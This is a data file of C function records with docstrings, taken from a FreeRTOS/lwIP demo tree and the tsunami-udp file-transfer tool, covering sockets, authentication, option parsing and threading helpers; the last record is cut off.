{"docstring": "/****************************************************************************/\n/**\n*\n* This functions receives a single byte using the DCC. It is blocking in that\n* it waits for the receiver to become non-empty before it reads from the\n* receive register.\n*\n* @param\tBaseAddress is a dummy parameter to match the function proto\n*\t\tof functions for other stdio devices.\n*\n* @return\tThe byte of data received.\n*\n* @note\t\tNone.\n*\n******************************************************************************/\n", "func_signal": "u8 XCoresightPs_DccRecvByte(u32 BaseAddress)", "code": "{\n\tu8 Data = 0U;\n\t(void) BaseAddress;\n\n\twhile (!(XCoresightPs_DccGetStatus() & XCORESIGHTPS_DCC_STATUS_RX))\n\t\tdsb();\n\n#ifdef __aarch64__\n\tasm volatile (\"mrs %0, dbgdtrrx_el0\" : \"=r\" (Data));\n#elif defined (__GNUC__) || defined (__ICCARM__)\n\tasm volatile(\"mrc p14, 0, %0, c0, c5, 0\"\n\t\t\t: \"=r\" (Data));\n#else\n\t{\n\t\tvolatile register u32 Reg __asm(\"cp14:0:c0:c5:0\");\n\t\tData = Reg;\n\t}\n#endif\n\tisb();\n\n\treturn Data;\n}", "path": "FreeRTOS\\Demo\\CORTEX_A53_64-bit_UltraScale_MPSoC\\RTOSDemo_A53_bsp\\psu_cortexa53_0\\libsrc\\coresightps_dcc_v1_4\\src\\xcoresightpsdcc.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/** Create a new mutex\n * @param mutex pointer to the mutex to create\n * @return a new mutex */\n", "func_signal": "err_t sys_mutex_new( sys_mutex_t *pxMutex )", "code": "{\nerr_t xReturn = ERR_MEM;\n\n\t*pxMutex = xSemaphoreCreateMutex();\n\n\tif( *pxMutex != NULL )\n\t{\n\t\txReturn = ERR_OK;\n\t\tSYS_STATS_INC_USED( mutex );\n\t}\n\telse\n\t{\n\t\tSYS_STATS_INC( mutex.err );\n\t}\n\n\treturn xReturn;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwip-1.4.0\\ports\\win32\\sys_arch.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/**\n * Processing exceptset is not yet implemented.\n */\n", "func_signal": "int\nlwip_select(int maxfdp1, fd_set *readset, fd_set *writeset, fd_set *exceptset,\n               struct timeval *timeout)", "code": "{\n  int i;\n  int nready;\n  fd_set lreadset, lwriteset, lexceptset;\n  u32_t msectimeout;\n  struct lwip_select_cb select_cb;\n  struct lwip_select_cb *p_selcb;\n\n  LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_select(%d, %p, %p, %p, tvsec=%ld tvusec=%ld)\\n\",\n                  maxfdp1, (void *)readset, (void *) writeset, (void *) exceptset,\n                  timeout ? (long)timeout->tv_sec : (long)-1,\n                  timeout ? (long)timeout->tv_usec : (long)-1));\n\n  select_cb.next = 0;\n  select_cb.readset = readset;\n  select_cb.writeset = writeset;\n  select_cb.exceptset = exceptset;\n  select_cb.sem_signalled = 0;\n\n  /* Protect ourselves searching through the list */\n  sys_sem_wait(selectsem);\n\n  if (readset)\n    lreadset = *readset;\n  else\n    FD_ZERO(&lreadset);\n  if (writeset)\n    lwriteset = *writeset;\n  else\n    FD_ZERO(&lwriteset);\n  if (exceptset)\n    lexceptset = *exceptset;\n  else\n    FD_ZERO(&lexceptset);\n\n  /* Go through each socket in each list to count number of sockets which\n     currently match */\n  nready = lwip_selscan(maxfdp1, &lreadset, &lwriteset, &lexceptset);\n\n  /* If we don't have any current events, then suspend if we are supposed to */\n  if (!nready) {\n    if (timeout && timeout->tv_sec == 0 && timeout->tv_usec == 0) {\n      sys_sem_signal(selectsem);\n      if (readset)\n        FD_ZERO(readset);\n      if (writeset)\n        FD_ZERO(writeset);\n      if (exceptset)\n        FD_ZERO(exceptset);\n  \n      LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_select: no timeout, returning 0\\n\"));\n      set_errno(0);\n  \n      return 0;\n    }\n    \n    /* add our semaphore to list */\n    /* We don't actually need any dynamic memory. Our entry on the\n     * list is only valid while we are in this function, so it's ok\n     * to use local variables */\n    \n    select_cb.sem = sys_sem_new(0);\n    /* Note that we are still protected */\n    /* Put this select_cb on top of list */\n    select_cb.next = select_cb_list;\n    select_cb_list = &select_cb;\n    \n    /* Now we can safely unprotect */\n    sys_sem_signal(selectsem);\n    \n    /* Now just wait to be woken */\n    if (timeout == 0)\n      /* Wait forever */\n      msectimeout = 0;\n    else {\n      msectimeout =  ((timeout->tv_sec * 1000) + ((timeout->tv_usec + 500)/1000));\n      if(msectimeout == 0)\n        msectimeout = 1;\n    }\n    \n    i = sys_sem_wait_timeout(select_cb.sem, msectimeout);\n    \n    /* Take us off the list */\n    sys_sem_wait(selectsem);\n    if (select_cb_list == &select_cb)\n      select_cb_list = select_cb.next;\n    else\n      for (p_selcb = select_cb_list; p_selcb; p_selcb = p_selcb->next) {\n        if (p_selcb->next == &select_cb) {\n          p_selcb->next = select_cb.next;\n          break;\n        }\n      }\n    \n    sys_sem_signal(selectsem);\n    \n    sys_sem_free(select_cb.sem);\n    if (i == 0)  {\n      /* Timeout */\n      if (readset)\n        FD_ZERO(readset);\n      if (writeset)\n        FD_ZERO(writeset);\n      if (exceptset)\n        FD_ZERO(exceptset);\n  \n      LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_select: timeout expired\\n\"));\n      set_errno(0);\n  \n      return 0;\n    }\n    \n    if (readset)\n      lreadset = *readset;\n    else\n      FD_ZERO(&lreadset);\n    if (writeset)\n      lwriteset = *writeset;\n    else\n      FD_ZERO(&lwriteset);\n    if (exceptset)\n      lexceptset = *exceptset;\n    else\n      FD_ZERO(&lexceptset);\n    \n    /* See what's set */\n    nready = lwip_selscan(maxfdp1, &lreadset, &lwriteset, &lexceptset);\n  } else\n    sys_sem_signal(selectsem);\n  \n  if (readset)\n    *readset = lreadset;\n  if (writeset)\n    *writeset = lwriteset;\n  if (exceptset)\n    *exceptset = lexceptset;\n  \n  LWIP_DEBUGF(SOCKETS_DEBUG, (\"lwip_select: nready=%d\\n\", nready));\n  set_errno(0);\n  \n  return nready;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_132\\src\\api\\sockets.c", "repo_name": "cjlano/freertos", "stars": 220, "license": "None", "language": "c", "size": 100859}
{"docstring": "/*------------------------------------------------------------------------\n * void reset_client(ttp_parameter_t *parameter);\n *\n * Resets the set of default parameters to their default values.\n *------------------------------------------------------------------------*/\n", "func_signal": "void reset_client(ttp_parameter_t *parameter)", "code": "{\n    /* free the previous hostname if necessary */\n    if (parameter->server_name != NULL)\n\tfree(parameter->server_name);\n\n    /* zero out the memory structure */\n    memset(parameter, 0, sizeof(*parameter));\n\n    /* fill the fields with their defaults */\n    parameter->block_size    = DEFAULT_BLOCK_SIZE;\n    parameter->server_name   = strdup(DEFAULT_SERVER_NAME);\n    parameter->server_port   = DEFAULT_SERVER_PORT;\n    parameter->client_port   = DEFAULT_CLIENT_PORT;\n    parameter->udp_buffer    = DEFAULT_UDP_BUFFER;\n    parameter->verbose_yn    = DEFAULT_VERBOSE_YN;\n    parameter->transcript_yn = DEFAULT_TRANSCRIPT_YN;\n    parameter->ipv6_yn       = DEFAULT_IPV6_YN;\n    parameter->output_mode   = DEFAULT_OUTPUT_MODE;\n    parameter->target_rate   = DEFAULT_TARGET_RATE;\n    parameter->rate_adjust   = DEFAULT_RATE_ADJUST;\n    parameter->error_rate    = DEFAULT_ERROR_RATE;\n    parameter->slower_num    = DEFAULT_SLOWER_NUM;\n    parameter->slower_den    = DEFAULT_SLOWER_DEN;\n    parameter->faster_num    = DEFAULT_FASTER_NUM;\n    parameter->faster_den    = DEFAULT_FASTER_DEN;\n    parameter->history       = DEFAULT_HISTORY;\n    parameter->lossless      = DEFAULT_LOSSLESS;\n    parameter->losswindow_ms = DEFAULT_LOSSWINDOW_MS;\n    parameter->blockdump     = DEFAULT_BLOCKDUMP;\n\n    /* make sure the strdup() worked */\n    if (parameter->server_name == NULL)\n      error(\"Could not reset default server name\");\n}", "path": "client\\config.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "// Compile:\n//   gcc bskp.c -o bskp\n", "func_signal": "int main(void)", "code": "{\n  int c = 0, i;\n\n  while (c!=EOF) {\n     for (i=0; i<3 && c!=EOF; i++) { // read+write 3\n        c = getc(stdin);\n        putc(c, stdout);\n     }\n     c = getc(stdin); // read+skip 1\n  }\n\n  return 0;\n}", "path": "util\\bskp.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * int ttp_open_transfer(ttp_session_t *session);\n *\n * Tries to create a new TTP file request object for the given session\n * by reading the name of a requested file from the client.  If we are\n * able to negotiate the transfer successfully, we return 0.  If we\n * can't negotiate the transfer because of I/O or file errors, we\n * return a negative vlaue.\n *\n * The client is sent a result byte of 0 if the request is accepted\n * (because the file can be read) and a non-zero result byte otherwise.\n *------------------------------------------------------------------------*/\n", "func_signal": "int ttp_open_transfer(ttp_session_t *session)", "code": "{\n    char             filename[MAX_FILENAME_LENGTH];  /* the name of the file to transfer     */\n    u_int64_t        file_size;                      /* network-order version of file size   */\n    u_int32_t        block_size;                     /* network-order version of block size  */\n    u_int32_t        block_count;                    /* network-order version of block count */\n    time_t           epoch;\n    int              status;\n    ttp_transfer_t  *xfer  = &session->transfer;\n    ttp_parameter_t *param =  session->parameter;\n\n    #ifdef VSIB_REALTIME\n    /* VLBI/VSIB-related variables */\n    struct evn_filename *ef;\n    double starttime;\n    struct timeval d;\n    #endif\n\n    char       size[10];\n    char       file_no[10];\n    char       message[20];\n    u_int16_t  i;\n    struct     timeval ping_s, ping_e;\n\n    /* clear out the transfer data */\n    memset(xfer, 0, sizeof(*xfer));\n\n    /* read in the requested filename */\n    status = read_line(session->client_fd, filename, MAX_FILENAME_LENGTH);\n    if (status < 0) {\n        #ifndef VSIB_REALTIME\n        error(\"Could not read filename from client\");\n        #else\n        return warn(\"Could not read filename from client\");\n        #endif\n    }\n    filename[MAX_FILENAME_LENGTH - 1] = '\\0';\n\n    if(!strcmp(filename, TS_DIRLIST_HACK_CMD)) {\n\n      /* The client requested listing of files and their sizes (dir command)\n       * Send strings:   NNN \\0   name1 \\0 len1 \\0     nameN \\0 lenN \\0\n       */\n       snprintf(file_no, sizeof(file_no), \"%u\", param->total_files);\n       full_write(session->client_fd, file_no, strlen(file_no)+1);\n       for(i=0; i<param->total_files; i++) {\n          full_write(session->client_fd, param->file_names[i], strlen(param->file_names[i])+1);\n          snprintf(message, sizeof(message), \"%Lu\", (ull_t)(param->file_sizes[i]));\n          full_write(session->client_fd, message, strlen(message)+1);\n       }\n       full_read(session->client_fd, message, 1);\n       return warn(\"File list sent!\");\n\n    } else if(!strcmp(filename,\"*\")) {\n\n      /* A multiple file request - sent the file names first, \n       * and next the client requests a download of each in turn (get * command)\n       */\n       memset(size, 0, sizeof(size));\n       snprintf(size, sizeof(size), \"%u\", param->file_name_size);\n       full_write(session->client_fd, size, 10);\n\n       memset(file_no, 0, sizeof(file_no));\n       snprintf(file_no, sizeof(file_no), \"%u\", param->total_files);\n       full_write(session->client_fd, file_no, 10);\n\n       printf(\"\\nSent multi-GET filename count and array size to client\\n\");\n       memset(message, 0, sizeof(message));\n       full_read(session->client_fd, message, 8);\n       printf(\"Client response: %s\\n\", message);\n\n       for(i=0; i<param->total_files; i++)\n          full_write(session->client_fd, param->file_names[i], strlen(param->file_names[i])+1);\n\n       memset(message, 0, sizeof(message));\n       full_read(session->client_fd, message, 8);\n       printf(\"Sent file list, client response: %s\\n\", message);\n\n       status = read_line(session->client_fd, filename, MAX_FILENAME_LENGTH);\n\n       if (status < 0) {\n          #ifndef VSIB_REALTIME\n          error(\"Could not read filename from client\");\n          #else\n          return warn(\"Could not read filename from client\");\n          #endif\n       }\n    }\n\n    /* store the filename in the transfer object */\n    xfer->filename = strdup(filename);\n    if (xfer->filename == NULL)\n    return warn(\"Memory allocation error\");\n\n    /* make a note of the request */\n    if (param->verbose_yn)\n    printf(\"Request for file: '%s'\\n\", filename);\n\n    #ifndef VSIB_REALTIME\n\n    /* try to open the file for reading */\n    xfer->file = fopen(filename, \"r\");\n    if (xfer->file == NULL) {\n        sprintf(g_error, \"File '%s' does not exist or cannot be read\", filename);\n        /* signal failure to the client */\n        status = full_write(session->client_fd, \"\\x008\", 1);\n        if (status < 0) {\n        warn(\"Could not signal request failure to client\");\n    }\n        return warn(g_error);\n    }\n\n    #else\n\n    /* detect whether local disk copy is wanted */\n    /* note: the same parse_evn_filename() extracts the UTC/VEX/undelimited start time timestamp from the filename */\n    if (strrchr(filename,'/') == NULL) {\n        ef = parse_evn_filename(filename);\n        param->fileout = 0;\n    } else {\n        ef = parse_evn_filename(strrchr(filename, '/')+1);\n        param->fileout = 1;\n    }\n    if (!ef->valid) {\n        fprintf(stderr, \"Warning: EVN filename parsing failed, '%s' not following EVN File Naming Convention?\\n\", filename);\n    }\n\n    /* get time multiplexing info from EVN filename (currently these are all unused) */\n    if (get_aux_entry(\"sl\",ef->auxinfo, ef->nr_auxinfo) == 0) {\n        param->totalslots= 1;          /* default to 1 */\n    } else {\n        sscanf(get_aux_entry(\"sl\",ef->auxinfo, ef->nr_auxinfo), \"%d\", &(param->totalslots));\n    }\n    if (get_aux_entry(\"sn\",ef->auxinfo, ef->nr_auxinfo) == 0) {\n        param->slotnumber= 1;          /* default to 1 */\n    } else {\n        sscanf(get_aux_entry(\"sn\",ef->auxinfo, ef->nr_auxinfo), \"%d\", &param->slotnumber);\n    }\n    if (get_aux_entry(\"sr\",ef->auxinfo, ef->nr_auxinfo) == 0) {\n        param->samplerate= 512;          /* default to 512 Msamples/s */\n    } else { \n        sscanf(get_aux_entry(\"sr\",ef->auxinfo, ef->nr_auxinfo), \"%d\", &param->samplerate);\n    }\n\n    /* try to open the vsib for reading */\n    xfer->vsib = fopen(\"/dev/vsib\", \"r\");\n    if (xfer->vsib == NULL) {\n        sprintf(g_error, \"VSIB board does not exist in /dev/vsib or it cannot be read\");\n        status = full_write(session->client_fd, \"\\002\", 1);\n        if (status < 0) {\n            warn(\"Could not signal request failure to client\");\n        }\n        return warn(g_error);\n    }\n\n    /* try to open the local disk copy file for writing */\n    if (param->fileout) {\n        xfer->file = fopen(filename, \"wb\");\n        if (xfer->file == NULL) {\n            sprintf(g_error, \"Could not open local file '%s' for writing\", filename);\n            status = full_write(session->client_fd, \"\\x010\", 1);\n            if (status < 0) {\n                warn(\"Could not signal request failure to client\");\n            }\n            fclose(xfer->vsib);\n            return warn(g_error);\n        }\n    }\n\n    /* Start half a second before full UTC seconds change. If EVN filename date/time parse failed, start immediately. */\n    if (!(NULL == ef->data_start_time_ascii || ef->data_start_time <= 1.0)) {\n        u_int64_t timedelta_usec;\n        starttime = ef->data_start_time - 0.5;\n\n        assert( gettimeofday(&d, NULL) == 0 );\n        timedelta_usec = (unsigned long)((starttime - (double)d.tv_sec)* 1000000.0) - (double)d.tv_usec;\n        fprintf(stderr, \"Sleeping until specified time (%s) for %Lu usec...\\n\", ef->data_start_time_ascii, (ull_t)timedelta_usec);\n        usleep_that_works(timedelta_usec);\n    }\n\n    /* Check if the client is still connected after the long(?) wait */\n    //if(recv(session->client_fd, &status, 1, MSG_PEEK)<0) {\n    //    // connection has terminated, exit\n    //    fclose(xfer->vsib);\n    //    return warn(\"The client disconnected while server was sleeping.\");\n    //}\n\n    /* start at next 1PPS pulse */\n    start_vsib(session);\n\n    #endif // end of VSIB_REALTIME section\n\n    /* begin round trip time estimation */\n    gettimeofday(&ping_s,NULL);\n\n    /* try to signal success to the client */\n    status = full_write(session->client_fd, \"\\000\", 1);\n    if (status < 0)\n    return warn(\"Could not signal request approval to client\");\n\n    /* read in the block size, target bitrate, and error rate */\n    if (full_read(session->client_fd, &param->block_size,  4) < 0) return warn(\"Could not read block size\");            param->block_size  = ntohl(param->block_size);\n    if (full_read(session->client_fd, &param->target_rate, 4) < 0) return warn(\"Could not read target bitrate\");        param->target_rate = ntohl(param->target_rate);\n    if (full_read(session->client_fd, &param->error_rate,  4) < 0) return warn(\"Could not read error rate\");            param->error_rate  = ntohl(param->error_rate);\n\n    /* end round trip time estimation */\n    gettimeofday(&ping_e,NULL);\n\n    /* read in the slowdown and speedup factors */\n    if (full_read(session->client_fd, &param->slower_num,  2) < 0) return warn(\"Could not read slowdown numerator\");    param->slower_num  = ntohs(param->slower_num);\n    if (full_read(session->client_fd, &param->slower_den,  2) < 0) return warn(\"Could not read slowdown denominator\");  param->slower_den  = ntohs(param->slower_den);\n    if (full_read(session->client_fd, &param->faster_num,  2) < 0) return warn(\"Could not read speedup numerator\");     param->faster_num  = ntohs(param->faster_num);\n    if (full_read(session->client_fd, &param->faster_den,  2) < 0) return warn(\"Could not read speedup denominator\");   param->faster_den  = ntohs(param->faster_den);\n\n    #ifndef VSIB_REALTIME\n    /* try to find the file statistics */\n    fseeko(xfer->file, 0, SEEK_END);\n    param->file_size   = ftello(xfer->file);\n    fseeko(xfer->file, 0, SEEK_SET);\n    #else\n    /* get length of recording in bytes from filename */\n    if (get_aux_entry(\"flen\", ef->auxinfo, ef->nr_auxinfo) != 0) {\n        sscanf(get_aux_entry(\"flen\", ef->auxinfo, ef->nr_auxinfo), \"%\" SCNu64, (u_int64_t*) &(param->file_size));\n    } else if (get_aux_entry(\"dl\", ef->auxinfo, ef->nr_auxinfo) != 0) {\n        sscanf(get_aux_entry(\"dl\", ef->auxinfo, ef->nr_auxinfo), \"%\" SCNu64, (u_int64_t*) &(param->file_size));\n    } else {\n       int found = 0;\n       for (i=0; i<ef->nr_auxinfo && !found; i++) {\n          if (!strncmp(ef->auxinfo[i], \"sl\", 2) || !strncmp(ef->auxinfo[i], \"dl\", 2)) {\n              sscanf(ef->auxinfo[i]+2, \"%\" SCNu64, (u_int64_t*) &(param->file_size));\n              found = 1;\n          } else if(!strncmp(ef->auxinfo[i], \"flen\", 4)) {\n              sscanf(ef->auxinfo[i]+4, \"%\" SCNu64, (u_int64_t*) &(param->file_size));\n              found = 1;              \n          }\n       }\n       /* default to amount of bytes equivalent to 4 minutes at 512Mbps */\n       if (!found)\n           param->file_size = 60LL * 512000000LL * 4LL / 8; \n    }\n    fprintf(stderr, \"Realtime file length in bytes: %Lu\\n\", (ull_t)param->file_size);\n    #endif\n\n    param->block_count = (param->file_size / param->block_size) + ((param->file_size % param->block_size) != 0);\n    param->epoch       = time(NULL);\n\n    /* reply with the length, block size, number of blocks, and run epoch */\n    file_size   = htonll(param->file_size);    if (full_write(session->client_fd, &file_size,   8) < 0) return warn(\"Could not submit file size\");\n    block_size  = htonl (param->block_size);   if (full_write(session->client_fd, &block_size,  4) < 0) return warn(\"Could not submit block size\");\n    block_count = htonl (param->block_count);  if (full_write(session->client_fd, &block_count, 4) < 0) return warn(\"Could not submit block count\");\n    epoch       = htonl (param->epoch);        if (full_write(session->client_fd, &epoch,       4) < 0) return warn(\"Could not submit run epoch\");\n\n    /*calculate and convert RTT to u_sec*/\n    session->parameter->wait_u_sec=(ping_e.tv_sec - ping_s.tv_sec)*1000000+(ping_e.tv_usec-ping_s.tv_usec);\n    /*add a 10% safety margin*/\n    session->parameter->wait_u_sec = session->parameter->wait_u_sec + ((int)(session->parameter->wait_u_sec* 0.1));  \n\n    /* and store the inter-packet delay */\n    param->ipd_time   = (u_int32_t) ((1000000LL * 8 * param->block_size) / param->target_rate);\n    xfer->ipd_current = param->ipd_time * 3;\n\n    /* if we're doing a transcript */\n    if (param->transcript_yn)\n    xscript_open(session);\n\n    /* we succeeded! */\n    return 0;\n}", "path": "rtserver\\protocol.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * void process_options(int argc, char *argv[],\n *                      ttp_parameter_t *parameter);\n *\n * Processes the command-line options and sets the protocol parameters\n * as appropriate.\n *------------------------------------------------------------------------*/\n", "func_signal": "void process_options(int argc, char *argv[], ttp_parameter_t *parameter)", "code": "{\n    struct option long_options[] = { { \"verbose\",    0, NULL, 1 },\n\t\t\t\t     { \"transcript\", 0, NULL, 2 },\n\t\t\t\t     { \"v6\",         0, NULL, 3 },\n\t\t\t\t     { \"port\",       1, NULL, 4 },\n\t\t\t\t     { \"secret\",     1, NULL, 5 },\n\t\t\t\t     { \"datagram\",   1, NULL, 6 },\n\t\t\t\t     { \"buffer\",     1, NULL, 7 },\n\t\t\t\t     { \"v\",          0, NULL, 8 },\n\t\t\t\t     { NULL,         0, NULL, 0 } };\n    int           which;\n\n    /* for each option found */\n    while ((which = getopt_long(argc, argv, \"+\", long_options, NULL)) > 0) {\n\n\t/* depending on which option we got */\n\tswitch (which) {\n\n\t    /* --verbose    : enter verbose mode for debugging */\n\t    case 8:\n\t    case 1:  parameter->verbose_yn = 1;\n\t\t     break;\n\n\t    /* --transcript : enter transcript mode for recording stats */\n\t    case 2:  parameter->transcript_yn = 1;\n\t             break;\n\n\t    /* --v6         : enter IPv6 mode */\n\t    case 3:  parameter->ipv6_yn = 1;\n\t             break;\n\n\t    /* --port=i     : port number for the server */\n\t    case 4:  parameter->tcp_port   = atoi(optarg);\n\t\t     break;\n\n\t    /* --secret=s   : shared secret for the client and server */\n\t    case 5:  parameter->secret     = (u_char*)optarg;\n\t\t     break;\n\n\t    /* --datagram=i : size of datagrams in bytes */\n\t    case 6:  parameter->block_size = atoi(optarg);\n\t\t     break;\n\n\t    /* --buffer=i   : size of socket buffer */\n\t    case 7:  parameter->udp_buffer = atoi(optarg);\n\t\t     break;\n\n             \n\t    /* otherwise    : display usage information */\n        default: \n             fprintf(stderr, \"Usage: tsunamid [--verbose] [--transcript] [--v6] [--port=n] [--datagram=bytes] [--buffer=bytes] [filename1 filename2 ...]\\n\");\n\t\t     fprintf(stderr, \"Defaults: verbose    = %d\\n\",   DEFAULT_VERBOSE_YN);\n\t\t     fprintf(stderr, \"          transcript = %d\\n\",   DEFAULT_TRANSCRIPT_YN);\n\t\t     fprintf(stderr, \"          v6         = %d\\n\",   DEFAULT_IPV6_YN);\n\t\t     fprintf(stderr, \"          port       = %d\\n\",   DEFAULT_TCP_PORT);\n\t\t     fprintf(stderr, \"          datagram   = %d\\n\",   DEFAULT_BLOCK_SIZE);\n             fprintf(stderr, \"          buffer     = %d\\n\",   DEFAULT_UDP_BUFFER);\n             fprintf(stderr, \"\\n\");\n\t\t     fprintf(stderr, \"verbose or v : turns on verbose output mode\\n\");\n\t\t     fprintf(stderr, \"transcript   : turns on transcript mode for statistics recording\\n\");\n\t\t     fprintf(stderr, \"v6           : operates using IPv6 instead of (not in addition to!) IPv4\\n\");\n\t\t     fprintf(stderr, \"port         : specifies which TCP port on which to listen to incoming connections\\n\");\n\t\t     fprintf(stderr, \"secret       : specifies the shared secret for the client and server\\n\");\n\t\t     fprintf(stderr, \"datagram     : specifies the desired datagram size (in bytes)\\n\");\n\t\t     fprintf(stderr, \"buffer       : specifies the desired size for UDP socket send buffer (in bytes)\\n\");\n             fprintf(stderr, \"filenames    : list of files that can be downloaded with a 'get *'\\n\");\n             fprintf(stderr, \"\\n\");\n             exit(1);\n    }\n    }\n    \n    if (argc>optind) {\n        int counter;\n        fprintf(stderr, \"\\nThe specified %d files will be listed on GET *:\\n\", argc-optind);\n        parameter->file_names = argv+optind;\n        parameter->file_name_size = 0;\n        parameter->total_files = argc-optind;    \n        for (counter=0; counter < argc-optind; counter++) {\n            fprintf(stderr, \"  %d) %s\\n\", counter+1, parameter->file_names[counter]);\n            parameter->file_name_size += strlen(parameter->file_names[counter])+1;\n        }\n        fprintf(stderr, \"total characters %d\\n\", parameter->file_name_size);\n    }\n\n    if (1==parameter->verbose_yn) {\n       fprintf(stderr,\"Block size: %d\\n\", parameter->block_size);\n       fprintf(stderr,\"Buffer size: %d\\n\", parameter->udp_buffer);\n       fprintf(stderr,\"Port: %d\\n\", parameter->tcp_port);\n    }\n}", "path": "mk5server\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * void reap(int signum);\n *\n * A signal handler to take care of our children's deaths (SIGCHLD).\n *------------------------------------------------------------------------*/\n", "func_signal": "void reap(int signum)", "code": "{\n    int status;\n\n    /* accept as many deaths as we can */\n    while (waitpid(-1, &status, WNOHANG) > 0) {\n        fprintf(stderr,\"Child server process terminated with status code 0x%X\\n\", status);\n    }\n\n    /* reenable the handler */\n    signal(SIGCHLD, reap);\n}", "path": "mk5server\\main.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*\n * Re-entrant errno.\n *\n * Each thread has it's own errno variable in pthread_t.\n *\n * The benefit of using the pthread_t structure\n * instead of another TSD key is TSD keys are limited\n * on Win32 to 64 per process. Secondly, to implement\n * it properly without using pthread_t you'd need\n * to dynamically allocate an int on starting the thread\n * and store it manually into TLS and then ensure that you free\n * it on thread termination. We get all that for free\n * by simply storing the errno on the pthread_t structure.\n *\n * MSVC and Mingw32 already have their own thread-safe errno.\n *\n * #if defined( _REENTRANT ) || defined( _MT )\n * #define errno *_errno()\n *\n * int *_errno( void );\n * #else\n * extern int errno;\n * #endif\n *\n */\n", "func_signal": "int *\n_errno (void)", "code": "{\n  pthread_t self;\n  int *result;\n\n  if ((self = pthread_self ()) == NULL)\n    {\n      /*\n       * Yikes! unable to allocate a thread!\n       * Throw an exception? return an error?\n       */\n      result = &reallyBad;\n    }\n  else\n    {\n      result = &(self->ptErrno);\n    }\n\n  return (result);\n\n}", "path": "win32compat\\pthreads-w32-2-7-0-release\\errno.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * int ttp_authenticate(ttp_session_t *session, const u_char *secret);\n *\n * Given an active Tsunami session, returns 0 if we are able to\n * negotiate authentication successfully and a non-zero value\n * otherwise.\n *\n * The negotiation process works like this:\n *\n *     (1) The server [this process] sends 512 bits of random data\n *         to the client.\n *\n *     (2) The client XORs 512 bits of the shared secret onto this\n *         random data and responds with the MD5 hash of the result.\n *\n *     (3) The server does the same thing and compares the result.\n *         If the authentication succeeds, the server transmits a\n *         result byte of 0.  Otherwise, it transmits a non-zero\n *         result byte.\n *------------------------------------------------------------------------*/\n", "func_signal": "int ttp_authenticate(ttp_session_t *session, const u_char *secret)", "code": "{\n    u_char random[64];         /* the buffer of random data               */\n    u_char server_digest[16];  /* the MD5 message digest (for us)         */\n    u_char client_digest[16];  /* the MD5 message digest (for the client) */\n    int    i;\n    int    status;\n\n    /* obtain the random data */\n    status = get_random_data(random, 64);\n    if (status < 0)\n\treturn warn(\"Access to random data is broken\");\n\n    /* send the random data to the client */\n    status = full_write(session->client_fd, random, 64);\n    if (status < 0)\n\treturn warn(\"Could not send authentication challenge to client\");\n\n    /* read the results back from the client */\n    status = full_read(session->client_fd, client_digest, 16);\n    if (status < 0)\n\treturn warn(\"Could not read authentication response from client\");\n\n    /* compare the two digests */\n    prepare_proof(random, 64, secret, server_digest);\n    for (i = 0; i < 16; ++i)\n\tif (client_digest[i] != server_digest[i]) {\n\t    full_write(session->client_fd, \"\\001\", 1);\n\t    return warn(\"Authentication failed\");\n\t}\n\n    /* try to tell the client it worked */\n    status = full_write(session->client_fd, \"\\000\", 1);\n    if (status < 0)\n\treturn warn(\"Could not send authentication confirmation to client\");\n\n    /* we succeeded */\n    return 0;\n}", "path": "rtserver\\protocol.c", "repo_name": "cheetahmobile/tsunami-udp", "stars": 200, "license": "other", "language": "c", "size": 1151}
{"docstring": "/*------------------------------------------------------------------------\n * int create_tcp_socket(ttp_parameter_t *parameter);\n *\n * Establishes a new TCP server socket, returning the file descriptor\n * of the socket on success and a negative value on error.  This will\n * be an IPv6 socket if ipv6_yn is true and an IPv4 socket otherwise.\n *------------------------------------------------------------------------*/\n", "func_signal": "int create_tcp_socket(ttp_parameter_t *parameter)", "code": "{\n    struct addrinfo  hints;\n    struct addrinfo *info;\n    struct addrinfo *info_save;\n    char             buffer[10];\n    int              socket_fd;\n    int              yes = 1;\n    int              status;\n\n    /* set up the hints for getaddrinfo() */\n    memset(&hints, 0, sizeof(hints));\n    hints.ai_flags    = AI_PASSIVE;\n    hints.ai_family   = parameter->ipv6_yn ? AF_INET6 : AF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n\n    /* try to get address info for ourselves */\n    sprintf(buffer, \"%d\", parameter->tcp_port);\n    status = getaddrinfo(NULL, buffer, &hints, &info);\n    if (status)\n\treturn warn(\"Error in getting address information\");\n\n    /* for each address structure returned */\n    info_save = info;\n    do {\n\n\t/* try to create a socket of this type */\n\tsocket_fd = socket(info->ai_family, info->ai_socktype, info->ai_protocol);\n\tif (socket_fd < 0)\n\t    continue;\n\n\t/* make the socket reusable */\n\tstatus = setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));\n\tif (status < 0)\n\t    continue;\n\n\t/* and try to bind it */\n\tstatus = bind(socket_fd, info->ai_addr, info->ai_addrlen);\n\tif (status == 0)\n\t    break;\n\n    } while ((info = info->ai_next) != NULL);\n\n    /* free the allocated memory */\n    freeaddrinfo(info_save);\n\n    /* make sure that we succeeded with at least one address */\n    if (info == NULL)\n\treturn warn(\"Error in creating TCP server socket\");\n\n    /* listen for new connections */\n    status = listen(socket_fd, SOMAXCONN);\n    if (status < 0)\n\treturn warn(\"Error in listening on TCP server socket\");\n\n    /* return the file desscriptor */\n    return socket_fd;\n}", "path": "rtserver\\network.c", "repo_name": "cheetahmobile/tsunami-udp", 